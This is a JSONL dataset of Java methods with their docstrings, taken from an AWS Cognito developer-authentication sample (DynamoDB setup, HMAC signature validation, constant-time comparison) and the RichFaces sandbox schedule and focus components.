{"docstring": "/**\n * Looks up table name and creates one if it does not exist\n */\n", "func_signal": "public UserAuthentication()", "code": "{\n    ddb = new AmazonDynamoDBClient();\n    ddb.setRegion(RegionUtils.getRegion(Configuration.REGION));\n\n    try {\n        if (!doesTableExist(USER_TABLE)) {\n            createIdentityTable();\n        }\n    } catch (DataAccessException e) {\n        throw new RuntimeException(\"Failed to create device table.\", e);\n    }\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\UserAuthentication.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Authenticates the given username, signature combination. A signature is\n * generated and matched against the given signature. If they match then\n * returns true.\n * \n * @param username\n *            Unique user identifier\n * @param timestamp\n *            Timestamp of the request\n * @param signature\n *            Signature of the request\n * @return true if authentication was successful, false otherwise\n * @throws DataAccessException\n */\n", "func_signal": "public boolean authenticateUserSignature(String username, String timestamp, String signature)\n        throws DataAccessException", "code": "{\n    UserInfo user = getUserInfo(username);\n    if (user == null) {\n        return false;\n    }\n\n    String computedSignature = Utilities.sign(timestamp, user.getHashedPassword());\n    return Utilities.slowStringComparison(signature, computedSignature);\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\UserAuthentication.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Generate tokens for given UID. The tokens are encrypted using the key\n * corresponding to UID. Encrypted tokens are then wrapped in JSON object\n * before returning it. Useful in Anonymous and Identity modes\n * \n * @param uid\n *            Unique device identifier\n * @return encrypted tokens as JSON object\n * @throws Exception \n */\n", "func_signal": "public String getToken(String uid, Map<String,String> logins, String identityId) \n    throws Exception", "code": "{\n\n    DeviceInfo device = deviceAuthenticator.getDeviceInfo(uid);\n    if (device == null) {\n        throw new UnauthorizedException(\"Couldn't find device: \" + uid);\n    }\n\n    UserInfo user = userAuthenticator.getUserInfo(device.getUsername());\n    if (user == null) {\n        throw new UnauthorizedException(\"Couldn't find user: \" + device.getUsername());\n    }\n    \n    if (user != null && !user.getUsername().equals(logins.get(Configuration.DEVELOPER_PROVIDER_NAME))) {\n        throw new UnauthorizedException(\"User mismatch for device and logins map\");\n    }\n\n    log.info(\"Creating temporary credentials\");\n    GetOpenIdTokenForDeveloperIdentityResult result = byoiManagement.getOpenIdTokenFromCognito(user.getUsername(), logins, identityId);\n\n    log.info(\"Generating session tokens for UID : \" + uid);\n    return Utilities.prepareJsonResponseForTokens(result, device.getKey());\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\AWSCognitoDeveloperAuthenticationSample.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Used to create the device table. This function only needs to be called\n * once.\n */\n", "func_signal": "protected void createDeviceTable() throws DataAccessException", "code": "{\n    ProvisionedThroughput provisionedThroughput = new ProvisionedThroughput()\n            .withReadCapacityUnits(10L)\n            .withWriteCapacityUnits(5L);\n\n    ArrayList<AttributeDefinition> attributeDefinitions = new ArrayList<AttributeDefinition>();\n    attributeDefinitions.add(new AttributeDefinition().withAttributeName(\n            ATTRIBUTE_UID).withAttributeType(\"S\"));\n\n    ArrayList<KeySchemaElement> tableKeySchema = new ArrayList<KeySchemaElement>();\n    tableKeySchema.add(new KeySchemaElement().withAttributeName(ATTRIBUTE_UID)\n            .withKeyType(KeyType.HASH));\n\n    CreateTableRequest createTableRequest = new CreateTableRequest()\n            .withTableName(DEVICE_TABLE)\n            .withProvisionedThroughput(provisionedThroughput)\n            .withAttributeDefinitions(attributeDefinitions)\n            .withKeySchema(tableKeySchema);\n\n    try {\n        ddb.createTable(createTableRequest);\n    } catch (AmazonClientException e) {\n        throw new DataAccessException(\"Failed to create table: \" + DEVICE_TABLE, e);\n    }\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\DeviceAuthentication.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Verify if the login request is valid. Username and UID are authenticated.\n * The timestamp is checked to see it falls within the valid timestamp\n * window. The signature is computed and matched against the given\n * signature. Also its checked to see if the UID belongs to the username.\n * This function is useful in Identity mode\n * \n * @param username\n *            Unique user identifier\n * @param uid\n *            Unique device identifier\n * @param signature\n *            Base64 encoded HMAC-SHA256 signature derived from hash of\n *            salted-password and timestamp\n * @param timestamp\n *            Timestamp of the request in ISO8601 format\n * @return status code indicating if login request is valid or not\n * @throws DataAccessException\n * @throws UnauthorizedException\n */\n", "func_signal": "public void validateLoginRequest(String username, String uid, String signature, String timestamp)\n        throws DataAccessException, UnauthorizedException", "code": "{\n    if (!Utilities.isTimestampValid(timestamp)) {\n        throw new UnauthorizedException(\"Invalid timestamp: \" + timestamp);\n    }\n\n    log.info(String.format(\"Timestamp [ %s ] is valid\", timestamp));\n\n    // Validate signature\n    log.info(\"Validate signature: \" + signature);\n    UserInfo user = userAuthenticator.getUserInfo(username);\n    if (user == null) {\n        throw new UnauthorizedException(\"Couldn't find user: \" + username);\n    }\n\n    if (!validateSignature(timestamp, user.getHashedPassword(), signature)) {\n        throw new UnauthorizedException(\"Invalid signature: \" + signature);\n    }\n\n    log.info(\"Signature matched!!!\");\n\n    // Register device\n    DeviceInfo device = regenerateKey(uid, user.getUsername());\n    log.info(\"Device found/registered successfully!!!\");\n\n    if (!deviceBelongsToUser(user.getUsername(), device.getUsername())) {\n        throw new UnauthorizedException(String.format(\"User [ %s ] doesn't match the device's owner [ %s ]\",\n                user.getUsername(), device.getUsername()));\n    }\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\AWSCognitoDeveloperAuthenticationSample.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * This method is low performance string comparison function. The purpose of\n * this method is to prevent timing attack.\n */\n", "func_signal": "public static boolean slowStringComparison(String givenSignature, String computedSignature)", "code": "{\n    if (null == givenSignature || null == computedSignature\n            || givenSignature.length() != computedSignature.length())\n        return false;\n\n    int n = computedSignature.length();\n    boolean signaturesMatch = true;\n\n    for (int i = 0; i < n; i++) {\n        signaturesMatch &= (computedSignature.charAt(i) == givenSignature.charAt(i));\n    }\n\n    return signaturesMatch;\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\Utilities.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Authenticates the given username, password combination. Hash of password\n * is matched against the hash value stored for password field\n * \n * @param username\n *            Unique user identifier\n * @param password\n *            user password\n * @param uri\n *            endpoint URI\n * @return true if authentication was successful, false otherwise\n * @throws DataAccessException\n */\n", "func_signal": "public boolean authenticateUser(String username, String password, String uri) throws DataAccessException", "code": "{\n    if (null == username || null == password) {\n        return false;\n    }\n\n    UserInfo user = getUserInfo(username);\n    if (user == null) {\n        return false;\n    }\n    String hashedSaltedPassword = Utilities.getSaltedPassword(username, uri, password);\n    return hashedSaltedPassword.equals(user.getHashedPassword());\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\UserAuthentication.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * @return the list of device ID (UID) stored in the identity table.\n */\n", "func_signal": "public List<String> listDevices()", "code": "{\n    List<String> devices = new ArrayList<String>(1000);\n\n    ScanResult result = ddb.scan(new ScanRequest().withTableName(DEVICE_TABLE).withLimit(1000));\n\n    for (Map<String, AttributeValue> item : result.getItems()) {\n        String s = \"\";\n\n        for (Entry<String, AttributeValue> entry : item.entrySet()) {\n            s += \" ** \" + entry.getKey() + \" = \" + entry.getValue().getS();\n        }\n\n        devices.add(s);\n    }\n\n    return devices;\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\DeviceAuthentication.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Extract element from a JSON string\n * \n * @param json\n *            A string of JSON blob\n * @param element\n *            JSON key\n * @return the corresponding string value of the element\n */\n", "func_signal": "public static String extractElement(String json, String element)", "code": "{\n    boolean hasElement = (json.indexOf(element) != -1);\n    if (hasElement) {\n        int elementIndex = json.indexOf(element) + element.length() + 1;\n        int startIndex = json.indexOf(\"\\\"\", elementIndex);\n        int endIndex = json.indexOf(\"\\\"\", startIndex + 1);\n\n        return json.substring(startIndex + 1, endIndex);\n    }\n\n    return null;\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\Utilities.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Looks up table name and creates one if it does not exist\n */\n", "func_signal": "public DeviceAuthentication()", "code": "{\n    ddb = new AmazonDynamoDBClient();\n    ddb.setRegion(RegionUtils.getRegion(Configuration.REGION));\n    \n    try {\n        if (!doesTableExist(DEVICE_TABLE)) {\n            createDeviceTable();\n        }\n    } catch (DataAccessException e) {\n        throw new RuntimeException(\"Failed to create device table.\", e);\n    }\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\DeviceAuthentication.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Checks to see if given tableName exist\n * \n * @param tableName\n *            The table name to check\n * @return true if tableName exist, false otherwise\n */\n", "func_signal": "protected boolean doesTableExist(String tableName) throws DataAccessException", "code": "{\n    try {\n        DescribeTableRequest request = new DescribeTableRequest().withTableName(USER_TABLE);\n        DescribeTableResult result = ddb.describeTable(request);\n        return \"ACTIVE\".equals(result.getTable().getTableStatus());\n    } catch (ResourceNotFoundException e) {\n        return false;\n    } catch (AmazonClientException e) {\n        throw new DataAccessException(\"Failed to get status of table: \" + tableName, e);\n    }\n}", "path": "src\\main\\java\\com\\amazonaws\\cognito\\devauthsample\\identity\\UserAuthentication.java", "repo_name": "aws-samples/amazon-cognito-developer-authentication-sample", "stars": 99, "license": "apache-2.0", "language": "java", "size": 209}
{"docstring": "/**\n * Tells if showWeekends is true or false. If it is not set it returns\n * default value.\n *\n * @param schedule inspected schedule\n * @return value of showWeekends\n */\n", "func_signal": "public static boolean isShowWeekends(AbstractSchedule schedule)", "code": "{\n    Boolean showWeekends = schedule.getShowWeekends();\n    return showWeekends == null ? AbstractSchedule.DEFAULT_SHOW_WEEKENDS : schedule.getShowWeekends();\n}", "path": "schedule\\ui\\src\\main\\java\\org\\richfaces\\component\\AbstractSchedule.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "// --------------------- GETTER / SETTER METHODS ---------------------\n", "func_signal": "@Override\n        public int getRowCount()", "code": "{\n            if (rowCount == -1) {\n                rowCount = wrappedDataMap.size();\n            }\n            return rowCount;\n        }", "path": "showcase-sandbox\\src\\main\\java\\org\\richfaces\\sandbox\\schedule\\ScheduleBean.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "/**\n * Tells value of view. If it is not set it returns\n * default value.\n *\n * @param schedule inspected schedule\n * @return value of view\n */\n", "func_signal": "public static String getView(AbstractSchedule schedule)", "code": "{\n    String view = schedule.getView();\n    return view == null ? AbstractSchedule.DEFAULT_VIEW : view;\n}", "path": "schedule\\ui\\src\\main\\java\\org\\richfaces\\component\\AbstractSchedule.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "// -------------------------- OTHER METHODS --------------------------\n", "func_signal": "public void dateRangeChanged(ScheduleDateRangeChangeEvent event)", "code": "{\n        FacesContext.getCurrentInstance().addMessage(null, new FacesMessage(\"Date range changed\", event.toString()));\n        Calendar calendar = Calendar.getInstance();\n        calendar.setTime(event.getStartDate());\n        if (AbstractSchedule.VIEW_MONTH.equals(getView())) {\n            calendar.add(Calendar.DATE, 15);\n        }\n        setInitialDate(calendar.getTime());\n    }", "path": "showcase-sandbox\\src\\main\\java\\org\\richfaces\\sandbox\\schedule\\ScheduleBean.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "// --------------------- Interface ScheduleItemResizeListener ---------------------\n", "func_signal": "public void itemResize(ScheduleItemResizeEvent event)", "code": "{\n            if (event != recentlyProcessedEvent) {\n                recentlyProcessedEvent = event;\n                addMessage(\"I'd like to veto resizing, but nobody cares!\", FacesMessage.SEVERITY_WARN);\n            }\n        }", "path": "showcase-sandbox\\src\\main\\java\\org\\richfaces\\sandbox\\schedule\\ScheduleBean.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "// --------------------- Interface ScheduleViewChangeListener ---------------------\n", "func_signal": "public void viewChanged(ScheduleViewChangeEvent event)", "code": "{\n            if (event != recentlyProcessedEvent) {\n                recentlyProcessedEvent = event;\n                addMessage(event.toString(), FacesMessage.SEVERITY_INFO);\n            }\n        }", "path": "showcase-sandbox\\src\\main\\java\\org\\richfaces\\sandbox\\schedule\\ScheduleBean.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "/**\n * Gets first displayed day on schedule. This is used mainly when schedule\n * is in ajax or server mode to calculate initial events daterange.\n * Initial events are sent during first render in order to avoid extra\n * ajax request right after first render.\n *\n * @param schedule schedule configuration for which date is calculated\n * @return first day displayed on schedule\n */\n", "func_signal": "public static Date getFirstDisplayedDay(AbstractSchedule schedule)", "code": "{\n    Calendar calendar = Calendar.getInstance();\n    Date date = schedule.getDate();\n    if (date != null) {\n        calendar.setTime(date);\n    }\n    int firstDayOfWeek = getFirstDay(schedule);\n    calendar.setFirstDayOfWeek(firstDayOfWeek);\n    String view = getView(schedule);\n    boolean showWeekends = isShowWeekends(schedule);\n    if (VIEW_MONTH.equals(view)) {\n        calendar.set(Calendar.DATE, 1);\n        if (!showWeekends) {\n            int dayOfWeek = calendar.get(Calendar.DAY_OF_WEEK);\n            if (dayOfWeek == Calendar.SUNDAY) {\n                calendar.add(Calendar.DATE, 1);\n            } else if (dayOfWeek == Calendar.SATURDAY) {\n                calendar.add(Calendar.DATE, 2);\n            }\n        }\n        if (!showWeekends && firstDayOfWeek == Calendar.SUNDAY) {\n            firstDayOfWeek++;\n        }\n        /**\n         * Following 1 line is a fix to what i believe is a bug of java.util.Calendar\n         */\n        calendar.get(Calendar.DAY_OF_WEEK);\n        calendar.set(Calendar.DAY_OF_WEEK, firstDayOfWeek);\n        return calendar.getTime();\n    } else if (VIEW_AGENDA_WEEK.equals(view) || VIEW_BASIC_WEEK.equals(view)) {\n        calendar.set(Calendar.DAY_OF_WEEK, firstDayOfWeek);\n        if (!showWeekends) {\n            int dayOfWeek = calendar.get(Calendar.DAY_OF_WEEK);\n            if (dayOfWeek == Calendar.SUNDAY) {\n                calendar.add(Calendar.DATE, 1);\n            } else if (dayOfWeek == Calendar.SATURDAY) {\n                calendar.add(Calendar.DATE, 2);\n            }\n        }\n        return calendar.getTime();\n    } else if (VIEW_AGENDA_DAY.equals(view) || VIEW_BASIC_DAY.equals(view)) {\n        return calendar.getTime();\n    } else {\n        throw new IllegalStateException(\"Invalid view attribute: \" + view);\n    }\n}", "path": "schedule\\ui\\src\\main\\java\\org\\richfaces\\component\\AbstractSchedule.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "/**\n * Gets last displayed day on schedule.\n *\n * @param schedule schedule configuration for which date is calculated\n * @return last day displayed on schedule\n * @see AbstractSchedule#getFirstDisplayedDay(org.richfaces.component.AbstractSchedule)\n */\n", "func_signal": "public static Date getLastDisplayedDate(AbstractSchedule schedule)", "code": "{\n    Calendar calendar = Calendar.getInstance();\n    int firstDayOfWeek = getFirstDay(schedule);\n    String view = getView(schedule);\n    boolean showWeekends = isShowWeekends(schedule);\n    if (VIEW_MONTH.equals(view)) {\n        if (WEEK_MODE_FIXED.equals(getWeekMode(schedule))) {\n            calendar.setTime(getFirstDisplayedDay(schedule));\n            calendar.add(Calendar.DAY_OF_YEAR, 42);\n        } else {\n            Date date = schedule.getDate();\n            if (date != null) {\n                calendar.setTime(date);\n            }\n\n            if (!showWeekends && firstDayOfWeek == Calendar.SUNDAY) {\n                firstDayOfWeek++;\n            }\n            calendar.setFirstDayOfWeek(firstDayOfWeek);\n            calendar.set(Calendar.DATE, calendar.getActualMaximum(Calendar.DATE));\n            int dayOfWeek = firstDayOfWeek + 6;\n            if (dayOfWeek > Calendar.SATURDAY) {\n                dayOfWeek -= 7;\n            }\n            /**\n             * Following 1 line is a fix to what i believe is a bug of java.util.Calendar\n             */\n            calendar.get(Calendar.DAY_OF_WEEK);\n            calendar.set(Calendar.DAY_OF_WEEK, dayOfWeek);\n            calendar.add(Calendar.DATE, 1);\n        }\n        return calendar.getTime();\n    } else if (VIEW_AGENDA_WEEK.equals(view) || VIEW_BASIC_WEEK.equals(view)) {\n        calendar.setFirstDayOfWeek(firstDayOfWeek);\n        calendar.setTime(getFirstDisplayedDay(schedule));\n        calendar.add(Calendar.DATE, 7);\n        if (!showWeekends) {\n            int dayOfWeek = calendar.get(Calendar.DAY_OF_WEEK);\n            if (dayOfWeek - 1 == Calendar.SUNDAY) {\n                calendar.add(Calendar.DATE, -2);\n            } else if (dayOfWeek - 1 == Calendar.SATURDAY) {\n                calendar.add(Calendar.DATE, -1);\n            }\n        }\n        return calendar.getTime();\n    } else if (VIEW_AGENDA_DAY.equals(view) || VIEW_BASIC_DAY.equals(view)) {\n        calendar.setTime(getFirstDisplayedDay(schedule));\n        calendar.add(Calendar.DATE, 1);\n        return calendar.getTime();\n    } else {\n        throw new IllegalStateException(\"Invalid view attribute: \" + view);\n    }\n}", "path": "schedule\\ui\\src\\main\\java\\org\\richfaces\\component\\AbstractSchedule.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "/**\n * Tells value of firstDay. If it is not set it returns\n * default value.\n *\n * @param schedule inspected schedule\n * @return value of firstDay\n */\n", "func_signal": "public static int getFirstDay(AbstractSchedule schedule)", "code": "{\n    Integer firstDay = schedule.getFirstDay();\n    return firstDay == null ? AbstractSchedule.DEFAULT_FIRST_DAY : firstDay;\n}", "path": "schedule\\ui\\src\\main\\java\\org\\richfaces\\component\\AbstractSchedule.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "// --------------------- Interface ScheduleItemSelectListener ---------------------\n", "func_signal": "public void itemSelected(ScheduleItemSelectEvent event)", "code": "{\n            if (event != recentlyProcessedEvent) {\n                recentlyProcessedEvent = event;\n                addMessage(event.toString(), FacesMessage.SEVERITY_INFO);\n            }\n        }", "path": "showcase-sandbox\\src\\main\\java\\org\\richfaces\\sandbox\\schedule\\ScheduleBean.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "// --------------------------- CONSTRUCTORS ---------------------------\n", "func_signal": "public ScheduleBean()", "code": "{\n        Calendar instance = Calendar.getInstance();\n        instance.setTime(getInitialDate());\n        final String[] colors = new String[]{\"#00ff00\", \"#ff0000\", \"#0000ff\"};\n        Random random = new Random();\n        for (int i = -30; i < 60; i++) {\n            instance.set(Calendar.HOUR, minTime + random.nextInt(maxTime - minTime));\n            instance.set(Calendar.MINUTE, random.nextInt(59));\n            instance.add(Calendar.DAY_OF_YEAR, 1);\n            Map<String, Object> data = new HashMap<String, Object>();\n            data.put(\"category\", \"category-\" + (i % 3));\n            int taskId = taskIdSequence++;\n\n            allTasks.add(new ScheduleTask(\"\" + taskId, \"Title \" + taskId, instance.getTime(), instance.getTime(), data, colors[random.nextInt(3)]));\n        }\n    }", "path": "showcase-sandbox\\src\\main\\java\\org\\richfaces\\sandbox\\schedule\\ScheduleBean.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "// --------------------- Interface ScheduleDateRangeChangeListener ---------------------\n", "func_signal": "public void dateRangeChanged(ScheduleDateRangeChangeEvent event)", "code": "{\n            if (event != recentlyProcessedEvent) {\n                recentlyProcessedEvent = event;\n                addMessage(event.toString(), FacesMessage.SEVERITY_INFO);\n            }\n        }", "path": "showcase-sandbox\\src\\main\\java\\org\\richfaces\\sandbox\\schedule\\ScheduleBean.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "// -------------------------- OTHER METHODS --------------------------\n", "func_signal": "public int calculatePriority(UIComponent component)", "code": "{\n        final AbstractFocusModifier modifier = findModifier(component);\n        if (modifier != null && modifier.getPriority() != null) {\n            return modifier.getPriority();\n        }\n        UIComponent parentForm = component.getParent();\n        while (parentForm != null && !(parentForm instanceof UIForm)) {\n            parentForm = parentForm.getParent();\n        }\n        if (parentForm != null) {\n            return getUIInputChildrenCount(parentForm, component.getId());\n        } else {\n            return DEFAULT_PRIORITY;\n        }\n    }", "path": "focus\\ui\\src\\main\\java\\org\\richfaces\\component\\AbstractFocus.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "/**\n * Gets the value of the any property.\n * \n * <p>\n * This accessor method returns a reference to the live list,\n * not a snapshot. Therefore any modification you make to the\n * returned list will be present inside the JAXB object.\n * This is why there is not a <CODE>set</CODE> method for the any property.\n * \n * <p>\n * For example, to add a new item, do as follows:\n * <pre>\n *    getAny().add(newItem);\n * </pre>\n * \n * \n * <p>\n * Objects of the following type(s) are allowed in the list\n * {@link org.w3c.dom.Element }\n * {@link Object }\n * \n * \n */\n", "func_signal": "public List<Object> getAny()", "code": "{\n    if (any == null) {\n        any = new ArrayList<Object>();\n    }\n    return this.any;\n}", "path": "bootstrap\\demo\\src\\main\\java\\org\\richfaces\\bootstrap\\demo\\jaxb\\javaee\\FaceletTaglibTagConverterExtensionType.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "// --------------------- Interface ScheduleItemMoveListener ---------------------\n", "func_signal": "public void itemMove(ScheduleItemMoveEvent event)", "code": "{\n            if (event != recentlyProcessedEvent) {\n                recentlyProcessedEvent = event;\n                addMessage(\"I'd like to veto moving, but nobody cares!\", FacesMessage.SEVERITY_WARN);\n            }\n        }", "path": "showcase-sandbox\\src\\main\\java\\org\\richfaces\\sandbox\\schedule\\ScheduleBean.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "/**\n * Gets data from provided data model within given range.\n * Range is [startDate;endDate), which means that start date is inclusive\n * and end date is exclusive.\n * Data are in form of list of maps, which is ready to serialize to JSON.\n *\n * @param startDate date of earliest item\n * @param endDate   date of lates item\n * @return list of items as map of their properties\n */\n", "func_signal": "public List<Map<String, Object>> getScheduleData(Date startDate, Date endDate)", "code": "{\n    /**\n     * Locale must be US because this is the format the javascript widget supports\n     */\n    DateFormat format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm\", Locale.US);\n    format.setLenient(false);\n    DataModel dataModel = getDataModel();\n    if (dataModel instanceof ExtendedDataModel) {\n        DataVisitor visitor = new DataVisitor() {\n            //TODO Is this fine? or should we stack rowKeys and not use dataModel later on. I'don't know business rules of extendedDataModel, just used it once to do pagination with underlying EntityQuery from Seam\n\n            public DataVisitResult process(FacesContext context, Object rowKey, Object argument) {\n                return null;\n            }\n        };\n        ((ExtendedDataModel) dataModel).walk(getFacesContext(), visitor, new DateRange(startDate, endDate), null);\n    }\n    ELContext elContext = (ELContext) getFacesContext().getELContext();\n    ValueExpression valueExpression = getFacesContext().getApplication().getExpressionFactory()\n        .createValueExpression(elContext, \"#{\" + getVar() + \"}\", Object.class);\n    List<Map<String, Object>> data = new ArrayList<Map<String, Object>>();\n    for (int i = 0; i < dataModel.getRowCount(); i++) {\n        dataModel.setRowIndex(i);\n        valueExpression.setValue(elContext, dataModel.getRowData());\n        Map<String, Object> firstDataElement = new HashMap<String, Object>();\n// TODO shouldn't we check earlier if there is at most one renderable UIScheduleItem child?\n        for (UIComponent child : getChildren()) {\n            if (child instanceof AbstractScheduleItem) {\n                AbstractScheduleItem item = (AbstractScheduleItem) child;\n                if (!item.isRendered()) {\n                    continue;\n                }\n                firstDataElement.put(\"id\", item.getEventId());\n                firstDataElement.put(\"title\", item.getTitle());\n                if (item.getAllDay() != null) {\n                    firstDataElement.put(\"allDay\", item.getAllDay());\n                }\n                firstDataElement.put(\"start\", format.format(item.getStartDate()));\n                if (item.getEndDate() != null) {\n                    firstDataElement.put(\"end\", format.format(item.getEndDate()));\n                }\n                if (item.getUrl() != null) {\n                    firstDataElement.put(\"url\", item.getUrl());\n                }\n                if (item.getStyleClass() != null) {\n                    firstDataElement.put(\"className\", item.getStyleClass());\n                }\n                if (item.getEditable() != null) {\n                    firstDataElement.put(\"editable\", item.getEditable());\n                }\n                if (item.getData() != null) {\n                    firstDataElement.put(\"data\", item.getData());\n                }\n                if (item.getColor() != null) {\n                    firstDataElement.put(\"color\", item.getColor());\n                }\n                if (item.getBackgroundColor() != null) {\n                    firstDataElement.put(\"backgroundColor\", item.getBackgroundColor());\n                }\n                if (item.getBorderColor() != null) {\n                    firstDataElement.put(\"borderColor\", item.getBorderColor());\n                }\n                if (item.getTextColor() != null) {\n                    firstDataElement.put(\"textColor\", item.getTextColor());\n                }\n                data.add(firstDataElement);\n            }\n        }\n    }\n    valueExpression.setValue(elContext, null);\n    return data;\n}", "path": "schedule\\ui\\src\\main\\java\\org\\richfaces\\component\\AbstractSchedule.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "// -------------------------- OTHER METHODS --------------------------\n", "func_signal": "@Override\n        public Object getRowData()", "code": "{\n            if (getRowKey() == null) {\n                return null;\n            } else {\n                return wrappedDataMap.get(getRowKey());\n            }\n        }", "path": "showcase-sandbox\\src\\main\\java\\org\\richfaces\\sandbox\\schedule\\ScheduleBean.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "// --------------------- Interface ScheduleDateRangeSelectListener ---------------------\n", "func_signal": "public void dateRangeSelected(ScheduleDateRangeSelectEvent event)", "code": "{\n            if (event != recentlyProcessedEvent) {\n                recentlyProcessedEvent = event;\n                addMessage(event.toString(), FacesMessage.SEVERITY_INFO);\n            }\n        }", "path": "showcase-sandbox\\src\\main\\java\\org\\richfaces\\sandbox\\schedule\\ScheduleBean.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "// -------------------------- STATIC METHODS --------------------------\n", "func_signal": "public static AbstractFocusModifier findModifier(UIComponent component)", "code": "{\n        if (component instanceof AbstractFocusModifier) {\n            return (AbstractFocusModifier) component;\n        }\n        AbstractFocusModifier modifier = (AbstractFocusModifier) component.getFacet(AbstractFocus.FOCUS_MODIFIER_FACET_NAME);\n        if (modifier == null) {\n            for (UIComponent child : component.getChildren()) {\n                modifier = findModifier(child);\n                if (modifier != null) {\n                    break;\n                }\n            }\n        }\n        return modifier;\n    }", "path": "focus\\ui\\src\\main\\java\\org\\richfaces\\component\\AbstractFocus.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
{"docstring": "/**\n * Tells value of weekMode. If it is not set it returns\n * default value.\n *\n * @param schedule inspected schedule\n * @return value of weekMode\n */\n", "func_signal": "public static String getWeekMode(AbstractSchedule schedule)", "code": "{\n    String weekMode = schedule.getWeekMode();\n    return weekMode == null ? AbstractSchedule.DEFAULT_WEEK_MODE : weekMode;\n}", "path": "schedule\\ui\\src\\main\\java\\org\\richfaces\\component\\AbstractSchedule.java", "repo_name": "richfaces/richfaces-sandbox", "stars": 76, "license": "None", "language": "java", "size": 11467}
